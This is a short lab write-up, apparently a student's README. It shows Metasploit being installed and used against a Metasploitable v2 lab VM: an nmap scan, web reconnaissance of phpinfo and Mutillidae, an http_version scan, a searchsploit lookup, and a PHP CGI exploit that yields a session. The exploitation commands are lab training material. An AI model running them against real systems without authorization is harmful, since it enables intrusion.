# Metasploit


## Overview


## LAB TOOLS
- **Attacker**: Kali Linux (Metasploit_Framework)
- **Victim**: Metasploitable v2 (IP: 192.168.127.129)



## Environment setup

### Installation
````
sudo apt update
````
<img width="727" height="177" alt="image" src="https://github.com/user-attachments/assets/9c2890d8-76d7-4b60-976c-47a22dfb133d" />

````
sudo apt install metasploit-framework
````
<img width="1897" height="844" alt="image" src="https://github.com/user-attachments/assets/185cc689-d744-4c19-9f2f-68137049f3b1" />



## Web application VA with metasploit framework

### Scan out target
````
nmap 192.168.127.129 -sV -p 1-1000 -T4
````
<img width="1181" height="588" alt="image" src="https://github.com/user-attachments/assets/57ca5863-e55f-428b-9aac-57b32e44ab62" />

- In browser type: http://192.168.127.129/
<img width="940" height="757" alt="image" src="https://github.com/user-attachments/assets/24ab1c75-c78f-490d-8649-4b5cf66832c9" />

<img width="1910" height="853" alt="image" src="https://github.com/user-attachments/assets/185f1de6-a31f-41a2-a84e-ed0c24989a1d" />

- We can also click on `Reload`.

<img width="1911" height="874" alt="image" src="https://github.com/user-attachments/assets/e41e60c6-54a3-4b8e-aa49-97ddb8c60257" />

- In this we some information of our target.

- And we want specific type this: http://192.168.127.129/phpinfo.php
<img width="1312" height="847" alt="image" src="https://github.com/user-attachments/assets/4d298972-d493-4592-b934-4cfaefafa055" />

- After and back and click on `Mutillidae`:
<img width="942" height="591" alt="image" src="https://github.com/user-attachments/assets/432b45e0-7fe4-4f5b-8077-91493daf12fa" />

- And type this: http://192.168.127.129/mutillidae/robots.txt
<img width="911" height="266" alt="image" src="https://github.com/user-attachments/assets/6b3afb2d-506b-420f-ae9e-42543e029d04" />

- Also we can type others like: 
<img width="934" height="361" alt="image" src="https://github.com/user-attachments/assets/58258e4a-f071-4a98-8318-d1d3a924063f" />



### In terminal
````
msfconsole
````
or we can use `-q`
````
msfconsole -q
````
<img width="575" height="813" alt="image" src="https://github.com/user-attachments/assets/88ff15b9-5d5f-41dd-b0fc-e442a4a03f02" />

#### In metasploit 
````
search http_version
````
<img width="1471" height="302" alt="image" src="https://github.com/user-attachments/assets/7ee2fe7c-0a73-4b47-b403-db8abfe83442" />

- And select it
````
use auxiliary/scanner/http/http_version
````
or we can use this it the same:
````
use 0
show options
````
<img width="1882" height="445" alt="image" src="https://github.com/user-attachments/assets/39f689d0-aa70-4d3c-9fcf-c738b356b339" />

- We can use follow the ` Required`, like if it show `Proxies                no ` it mean this option we can use it or not. But if it show `RHOSTS                    yes` we need to use and follow it.

````
set rhosts 192.168.127.129
show options
````
<img width="1885" height="470" alt="image" src="https://github.com/user-attachments/assets/d16205f7-146f-400d-913e-9450aeba7338" />

- In this we can use `setg` in mean like when we change module to others module our target it always show, if we choose `set` when we change module we not see it.
- `RHOST / RHOSTS` : Remote Host(s). The IP (or list/range) of the target machine(s) you want to scan or exploit.
- `LHOST` : Local Host. The IP on your attacker machine (where Metasploit / the handler is running) that the target should connect back to for a reverse payload.
- `LPORT` : the port on your machine for the reverse connection (listener).
- `RPORT` : the port on the remote/target machine the exploit should target (e.g., 21 for FTP).

````
run
````
<img width="1152" height="145" alt="image" src="https://github.com/user-attachments/assets/a187dd1c-a2eb-4634-a656-bae932962fbc" />


#### search service apache target
````
searchsploit apache 2.2.8 | grep php
````
<img width="1060" height="162" alt="image" src="https://github.com/user-attachments/assets/330a4e93-93f9-4eeb-8364-fe627cc965ab" />


#### php
````
grep cgi search php 5.4.2
use 1
````
<img width="1605" height="148" alt="image" src="https://github.com/user-attachments/assets/a4a0b655-9df0-408b-bf36-1c9ce970ff3c" />

````
show options
````
<img width="1452" height="749" alt="image" src="https://github.com/user-attachments/assets/e751844c-cd49-4991-91a4-f04f9b25878c" />

#### exploit target
````
set rhosts 192.168.127.129
exploit
````
<img width="1111" height="824" alt="image" src="https://github.com/user-attachments/assets/8e4a8e21-dd8c-4cb9-b78e-5c5a82f1e1d4" />

````
sysinfo
````
<img width="967" height="143" alt="image" src="https://github.com/user-attachments/assets/1835794c-190d-4903-b5b6-2438d67fd939" />

- We get successful.


----


## Reference
1. https://www.youtube.com/watch?v=rpBCBl9pwkw&t=90s

---
## Practice in LAB by: Nin Kanong
---

### **Date**: 7/10/2025
----
